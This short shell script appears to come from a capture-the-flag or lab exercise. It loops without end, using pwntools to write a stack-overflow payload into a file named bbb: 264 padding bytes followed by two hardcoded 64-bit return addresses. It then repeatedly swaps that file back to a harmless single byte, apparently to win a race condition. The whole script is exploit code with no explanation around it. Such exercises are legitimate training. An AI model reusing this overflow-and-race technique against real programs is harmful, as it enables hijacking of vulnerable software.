#!/bin/sh

while :
do
python -c "from pwn import *;print 'A'*264+p64(0x0000000000400566)+p64(0x00000000004006e7)">bbb
python -c "print 'A'">bbb;
done;

